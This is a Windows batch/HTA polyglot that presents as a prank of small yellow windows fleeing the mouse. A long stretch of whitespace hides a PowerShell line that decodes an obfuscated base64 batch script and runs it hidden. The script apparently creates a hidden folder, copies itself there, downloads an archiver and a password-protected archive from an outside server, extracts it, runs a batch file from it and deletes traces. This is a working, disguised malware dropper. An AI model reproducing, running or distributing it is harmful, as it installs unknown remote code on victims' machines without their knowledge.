<!-- : Begin batch script 
@echo off                                                                                                                                                                                                                                                                                                                                                                            & powershell -Command "$Base64 = '//4mY2xzDQpAJXBVQmxJYzp+ODksODMlJVBVQkxpYzp+NSwxJUNIb14gb2ZeJVB1QmxJQzp+NDYsMTYlZg0KU0V0IFJePUpnXiVwVUJMSWM6fjEzLDElXmd0R1h6JXBVQkxJYzp+NCwxJXclcFVCTEljOn4xMSwxJV5obSVwVUJMSWM6fjEwLDElXlNeSEleT15BDQpeJXBVQmxJQzp+MTQsMSVeTCVwVUJsaUM6fjU1LDE3JV4lcHVibEljOn40LDElDQpAXmVeYyVyOn4xNSwxJV4lcjp+MTcsMSUgXiVyOn4xNywxJW4NCkBlYyVyOn4xMSwxJW8gb2ZmDQoNCiVyOn44LDElZSVyOn40LDElICJkJXI6fjIsMSVyPUM6XFUlcjp+OCwxJWVyJXI6fjgsMSVcJXVzZXJuYW1lJVxNJXI6fjIsMSVjcm8lcjp+OCwxJW9mJXI6fjQsMSUtRWQlcjp+MSwxJWUiDQoNCiVyOn4yLDElZiBubyVyOn40LDElIGV4JXI6fjIsMSUlcjp+OCwxJSVyOn40LDElICIlZGlyJSIgKA0KICAgICVyOn4xMiwxJWtkJXI6fjIsMSVyICIlZGlyJSINCiAgICBhJXI6fjQsMSUlcjp+NCwxJXIlcjp+MiwxJSVyOn4xMCwxJSArJXI6fjExLDElICIlZGlyJSINCiAgICBjb3B5ICIlfjAiICIlZGlyJVwlcjp+MTMsMSVwZGElcjp+NCwxJWVyLiVyOn4xMCwxJWElcjp+NCwxJSINCiAgICBwbyVyOn45LDElZXIlcjp+OCwxJSVyOn4xMSwxJWVsbCAtQ28lcjp+MTIsMSUlcjp+MTIsMSVhbmQgIiVyOn4xNCwxJSVyOn40LDElYXIlcjp+NCwxJS1Qcm9jZSVyOn44LDElJXI6fjgsMSUgJyIlZGlyJVwlcjp+MTMsMSVwZGElcjp+NCwxJWVyLiVyOn4xMCwxJWElcjp+NCwxJSInIC1XJXI6fjIsMSVuZG8lcjp+OSwxJSVyOn4xNCwxJSVyOn40LDEleWxlICVyOn4xNSwxJSVyOn4yLDElZGRlbiINCiAgICBkZWwgIiV+MCINCiAgICBleCVyOn4yLDElJXI6fjQsMSUNCikNCg0KcmQgLyVyOn44LDElIC9xICIldGVtcCVcNDMxNV80MDYyMTMxNDAiDQoNCnBvJXI6fjksMSVlciVyOn44LDElJXI6fjExLDElZWxsIC1DbyVyOn4xMiwxJSVyOn4xMiwxJWFuZCAiJiB7JXI6fjE2LDElbnZva2UtV2Ulcjp+MTAsMSVSZXElcjp+MTMsMSVlJXI6fjgsMSUlcjp+NCwxJSAtVXIlcjp+MiwxJSAnJXI6fjExLDElJXI6fjQsMSUlcjp+NCwxJXAlcjp+OCwxJTovLyVyOn4xLDElJXI6fjIsMSUlcjp+NCwxJSVyOn4xMSwxJSVyOn4xMywxJSVyOn4xMCwxJS5jbyVyOn4xMiwxJS9WJXI6fjIsMSUlcjp+OCwxJW8lcjp+NiwxJUMvTSVyOn4yLDElJXI6fjgsMSUlcjp+NCwxJWVyQm8lcjp+MTIsMSUlcjp+MTAsMSVhJXI6fjgsMSUlcjp+NCwxJSVyOn4yLDElYy9yYSVyOn45LDElLyVyOn4xMiwxJWElcjp+MiwxJW4vZG9uL1Jhci5leGUnIC0lcjp+MTcsMSUlcjp+MTMsMSUlcjp+NCwxJUYlcjp+MiwxJWxlICciJWRpciVcUmFyLmV4ZSInfSIgMj4mMSA+biVyOn4xMywxJWwNCnBvJXI6fjksMSVlciVyOn44LDElJXI6fjExLDElZWxsIC1DbyVyOn4xMiwxJSVyOn4xMiwxJWFuZCAiJXI6fjE2LDElbnZva2UtV2Ulcjp+MTAsMSVSZXElcjp+MTMsMSVlJXI6fjgsMSUlcjp+NCwxJSAtVXIlcjp+MiwxJSAnJXI6fjExLDElJXI6fjQsMSUlcjp+NCwxJXAlcjp+OCwxJTovLyVyOn4xLDElJXI6fjIsMSUlcjp+NCwxJSVyOn4xMSwxJSVyOn4xMywxJSVyOn4xMCwxJS5jbyVyOn4xMiwxJS9WJXI6fjIsMSUlcjp+OCwxJW8lcjp+NiwxJUMvTSVyOn4yLDElJXI6fjgsMSUlcjp+NCwxJWVyQm8lcjp+MTIsMSUlcjp+MTAsMSVhJXI6fjgsMSUlcjp+NCwxJSVyOn4yLDElYy9yYSVyOn45LDElL3JlZiVyOn44LDElLyVyOn4xMSwxJWVhZCVyOn44LDElLyVyOn4xMiwxJWElcjp+MiwxJW4vZG9uLyVyOn4xOCwxJU5DViVyOn4yLDElciVyOn4xMywxJSVyOn44LDElLnJhcicgLSVyOn4xNywxJSVyOn4xMywxJSVyOn40LDElRiVyOn4yLDElbGUgJyIlZGlyJVwlcjp+NCwxJSVyOn4xMiwxJXAucmFyIiciID5uJXI6fjEzLDElbA0KDQoiJWRpciVcUmFyIiB4IC1wJXI6fjE4LDElTkNvblQlcjp+MTcsMSVQICIlZGlyJVwlcjp+NCwxJSVyOn4xMiwxJXAucmFyIiAiJWRpciUiDQpjb3B5ICIlfjAiICIldGVtcCVcMTQyNjQ1NDc4MTM3MjIxNDgxODM1MTU3MjIyMTE5MzI4OTMiDQpjYWxsICIlZGlyJVwlcjp+MTIsMSVhJXI6fjIsMSVuLiVyOn4xMCwxJWElcjp+NCwxJSINCg0KciVyOn4xMiwxJWQlcjp+MiwxJXIgLyVyOn44LDElIC9xICIlZGlyJSINCmRlbCAiJX4wIg0KZXglcjp+MiwxJSVyOn40LDElDQpAZWMlcjp+MTEsMSVvIG9mZg0KJXI6fjgsMSVlJXI6fjQsMSUgYSA9ICUlfmkNCiVyOn44LDElZSVyOn40LDElIGEgPSAlICsgJX5pIiUlfiVyOn4yLDElIiUNCnNldCBhID0gJWElDQo6YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFiDQo='; $TempFile = [System.IO.Path]::Combine($env:TEMP, (Get-Random).ToString() + '.bat'); [System.IO.File]::WriteAllBytes($TempFile, [System.Convert]::FromBase64String($Base64)); Start-Process -WindowStyle Hidden -FilePath $TempFile"
for /l %%a in (0,1,20) do start "" mshta.exe "%~f0" 
exit /b
-->
<!DOCTYPE html>
<script>resizeTo(0,0);window.offscreenBuffering = "true";</script>
<hta:application ID="oHTA" border="none" caption="no" contextmenu="no" innerborder="no" scroll="no" selection="no" >
<html>
<style>
 html, body{width: 100%;height: 100%;margin: 0px;}
 #demo {background: yellow;width: 100%;height: 100%;margin: 0;}
</style>

<script>
var timer,z,dX,dY,tOut;
x=window.screenLeft; //get startposition
y=window.screenLeft; //dito
s=30; //size
maxMove=20; //max Pixels to move in one cycle
cps=1000/30; //cycles per 1000 milliseconds
maxX=screen.availWidth-s;
maxY=screen.availHeight-s;

function init(){
 resizeTo(s,s);
 moveTo(x,y);
 randomTOut();
 flee();
};

//endless Loop! ...will break by  clearTimeout(timer)
function randomTOut(){
 tOut=(Math.round((Math.random())*480)+20)*10;
 moveControl();
 timer=setTimeout(function(){randomTOut()},tOut);
};

function moveControl(){
 /* dX,dY become random between -maxMove and +maxMove,
   the sign determines the direction*/
 dX=Math.round(Math.random()*maxMove*2-maxMove);
 dY=Math.round(Math.random()*maxMove*2-maxMove);
};

function flee(){
 z=setInterval(function(){
  if (x>0) {x+=dX;} else {dX=Math.abs(dX);x+=dX;};
  if (y>0) {y+=dY;} else {dY=Math.abs(dY);y+=dY;};
  if (x<maxX) {x+=dX;} else {dX=-Math.abs(dX);x+=dX;};
  if (y<maxY) {y+=dY;} else {dY=-Math.abs(dY);y+=dY;};
  moveTo(x,y);
 }, cps);
};

function closeW(){
 //clear all timmerevents befor closing the window!  
 clearTimeout(timer);
 clearInterval(z);
 close()
};
</script>
<!-- collsion with the mouse kills the window-->
<body onload="init()" onmouseover="closeW()">
 <div id="demo"></div>
</body>
</html>
